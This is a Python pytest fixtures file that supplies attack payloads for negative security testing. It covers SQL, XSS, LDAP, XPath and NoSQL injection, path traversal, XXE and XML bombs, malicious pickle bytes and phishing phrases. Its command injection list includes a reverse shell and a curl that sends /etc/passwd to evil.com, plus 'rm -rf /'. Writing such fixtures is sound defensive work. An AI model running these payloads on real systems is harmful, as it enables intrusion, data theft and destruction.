"""
Attack vector fixtures for security testing
Provides known attack patterns and malicious inputs for negative testing
"""
import pytest
from typing import Dict, List, Any
import string
import itertools


@pytest.fixture
def sql_injection_vectors() -> List[str]:
    """SQL injection attack vectors for testing"""
    return [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 'a'='a",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users--",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1')=('1--",
        "1' OR '1' = '1",
        "1' OR 1 = 1",
        "' UNION ALL SELECT NULL--",
        "' AND (SELECT COUNT(*) FROM users) > 0--",
        "'; EXEC xp_cmdshell('dir')--",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR BENCHMARK(5000000, MD5('test'))--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
    ]


@pytest.fixture
def xss_vectors() -> List[str]:
    """Cross-site scripting attack vectors for testing"""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:msgbox('XSS')",
        "<object data=\"data:text/html,<script>alert('XSS')</script>\">",
        "<embed src=\"data:text/html,<script>alert('XSS')</script>\">",
        "<link rel=stylesheet href=\"javascript:alert('XSS')\">",
    ]


@pytest.fixture
def command_injection_vectors() -> List[str]:
    """Command injection attack vectors for testing"""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "$(whoami)",
        "`id`",
        "; nc -l 4444 -e /bin/sh",
        "| wget http://evil.com/backdoor.sh",
        "&& curl http://evil.com/steal.php?data=$(cat /etc/passwd)",
        "; python -c 'import os; os.system(\"ls\")'",
        "| perl -e 'system(\"whoami\")'",
        "&& php -r 'system(\"id\");'",
        "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
        "| telnet evil.com 4444",
        "&& echo vulnerable",
        "; sleep 10",
        "| ping -c 4 google.com",
        "&& nslookup google.com",
        "; dig google.com",
        "| netstat -an",
        "&& ps aux",
    ]


@pytest.fixture
def path_traversal_vectors() -> List[str]:
    """Path traversal attack vectors for testing"""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..//..//..//etc//passwd",
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam",
        "/var/log/../../../etc/passwd",
        "C:\\windows\\system32\\..\\..\\..\\windows\\system32\\config\\sam",
        "file:///../../../etc/passwd",
        "file:///C:/windows/system32/config/sam",
        "/.././.././.././etc/passwd",
        "\\..\\..\\..\\.\\windows\\system32\\config\\sam",
        "~/../../etc/passwd",
        "~\\..\\..\\windows\\system32\\config\\sam",
        "/proc/self/environ",
        "/proc/version",
    ]


@pytest.fixture
def buffer_overflow_vectors() -> List[str]:
    """Buffer overflow attack vectors for testing"""
    # Generate strings of various lengths to test buffer boundaries
    vectors = []
    
    # Common buffer sizes to test
    buffer_sizes = [8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192]
    
    for size in buffer_sizes:
        # Exact size
        vectors.append('A' * size)
        # Just over boundary
        vectors.append('A' * (size + 1))
        # Way over boundary
        vectors.append('A' * (size * 2))
        # Pattern to detect corruption
        vectors.append('AAAA' + 'B' * (size - 4))
    
    # Special characters that might cause issues
    special_chars = ['\x00', '\xff', '\x90', '\xcc']
    for char in special_chars:
        for size in [100, 1000, 10000]:
            vectors.append(char * size)
    
    return vectors


@pytest.fixture
def format_string_vectors() -> List[str]:
    """Format string attack vectors for testing"""
    return [
        "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
        "%08x" * 20,
        "%d" * 50,
        "%f" * 30,
        "%c" * 100,
        "%.1000000s",
        "%.1000000d",
        "%.1000000f",
        "%1000000s",
        "%1000000d",
        "%1000000f",
        "%*s",
        "%*d",
        "%*f",
        "%10000$s",
        "%10000$x",
        "%10000$n",
    ]


@pytest.fixture
def ldap_injection_vectors() -> List[str]:
    """LDAP injection attack vectors for testing"""
    return [
        "*",
        "*)(&",
        "*))%00",
        "admin)(&(password=*))",
        "admin)(&(|(objectclass=*)(password=*)))",
        "*)(uid=*))(|(uid=*",
        "*)(|(password=*))",
        "*)(|(cn=*))",
        "admin)(&(uid=admin)(password=*))",
        "admin)(&(|(uid=admin)(cn=admin))",
        "*)(userPassword=*)",
        "*)(mail=*)",
        "*)(objectclass=*",
    ]


@pytest.fixture
def xpath_injection_vectors() -> List[str]:
    """XPath injection attack vectors for testing"""
    return [
        "' or '1'='1",
        "' or 1=1 or ''='",
        "x' or name()='username' or 'x'='y",
        "' or text()='admin' or ''='",
        "' or position()=1 or ''='",
        "' or count(//*)>0 or ''='",
        "' or string-length(name())>0 or ''='",
        "admin' or '1'='1",
        "' and count(/*)=1 and ''='",
        "'] | //user[@name='admin' and @password='admin'] | a['",
        "' or substring(name(),1,1)='a' or ''='",
    ]


@pytest.fixture
def nosql_injection_vectors() -> List[Dict[str, Any]]:
    """NoSQL injection attack vectors for testing"""
    return [
        {"$ne": None},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "return true"},
        {"$or": [{"password": {"$regex": ".*"}}, {"username": {"$regex": ".*"}}]},
        {"username": {"$in": ["admin", "administrator", "root"]}},
        {"$expr": {"$eq": [1, 1]}},
        {"password": {"$exists": True}},
        {"$text": {"$search": "admin"}},
        {"$js": "function() { return true; }"},
    ]


@pytest.fixture
def xml_bomb_vectors() -> List[str]:
    """XML bomb/billion laughs attack vectors for testing"""
    return [
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
        '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "1234567890" ><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><bomb>&c;</bomb>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
    ]


@pytest.fixture
def regex_dos_vectors() -> List[str]:
    """Regular expression DoS attack vectors for testing"""
    return [
        # Catastrophic backtracking patterns
        "a" * 1000 + "X",  # For pattern like (a+)+b
        "a" * 1000,  # For pattern like (a*)*
        "a" * 1000 + "b" * 1000,  # For pattern like (a|a)*b
        # Nested quantifiers
        "(" + "a" * 100 + ")*" * 10,
        # Alternation explosion
        "|".join(["a" * i for i in range(1, 100)]),
        # Evil regex patterns
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
    ]


@pytest.fixture
def deserialization_vectors() -> List[bytes]:
    """Unsafe deserialization attack vectors for testing"""
    # Simulated malicious serialized objects
    return [
        b'\x80\x03c__builtin__\neval\nq\x01X\x0f\x00\x00\x00__import__("os")q\x02\x85q\x03Rq\x04.',
        b'\x80\x03cos\nsystem\nq\x01X\x06\x00\x00\x00whoamiq\x02\x85q\x03Rq\x04.',
        b'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABc3IAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHB3AQB4',
    ]


@pytest.fixture
def unicode_attack_vectors() -> List[str]:
    """Unicode-based attack vectors for testing"""
    return [
        # Unicode normalization attacks
        "á",  # U+00E1 (composed)
        "á",  # U+0061 U+0301 (decomposed)
        # Unicode bidirectional override attacks
        "\u202e" + "admin" + "\u202d",
        # Unicode null bytes
        "admin\u0000.txt",
        # Unicode homograph attacks
        "раураl",  # Cyrillic characters that look like "paypal"
        "аррӏе",  # Cyrillic that looks like "apple"
        # Unicode control characters
        "admin\u200d\u200c\u200b",
        # Unicode overlong sequences (if applicable)
        "\ufeff",  # Zero-width no-break space
        "\u200b",  # Zero-width space
    ]


@pytest.fixture
def timing_attack_vectors():
    """Timing attack vectors for testing"""
    return {
        'valid_inputs': [
            'validuser',
            'correctpass',
            'admin',
            'test@example.com',
        ],
        'invalid_inputs': [
            'invaliduser',
            'wrongpass',
            'hacker',
            'invalid@example.com',
        ],
        'edge_cases': [
            '',  # Empty
            'a',  # Single char
            'x' * 1000,  # Very long
            '\x00',  # Null byte
        ]
    }


@pytest.fixture
def social_engineering_vectors() -> List[str]:
    """Social engineering attack vectors for testing"""
    return [
        "URGENT: Your account will be closed!",
        "Verify your password immediately",
        "Click here to claim your prize",
        "Your account has been suspended",
        "Limited time offer - act now!",
        "Security alert: Unauthorized access detected",
        "Please update your payment information",
        "Congratulations! You've won $1,000,000!",
        "Your package is ready for delivery",
        "IRS: You owe back taxes",
        "Your computer is infected with viruses",
        "Someone is trying to hack your account",
        "Free gift card - no strings attached",
        "Your subscription is about to expire",
        "Act now or lose your data forever",
    ]


@pytest.fixture
def comprehensive_attack_suite():
    """Comprehensive collection of all attack vectors"""
    def get_all_vectors():
        return {
            'input_validation': [
                # Combine all input validation attacks
                *sql_injection_vectors(),
                *xss_vectors(),
                *command_injection_vectors(),
                *path_traversal_vectors(),
            ],
            'denial_of_service': [
                *buffer_overflow_vectors(),
                *regex_dos_vectors(),
            ],
            'injection_attacks': [
                *format_string_vectors(),
                *ldap_injection_vectors(),
                *xpath_injection_vectors(),
            ],
            'data_attacks': [
                *xml_bomb_vectors(),
                *unicode_attack_vectors(),
                *social_engineering_vectors(),
            ],
        }
    
    return get_all_vectors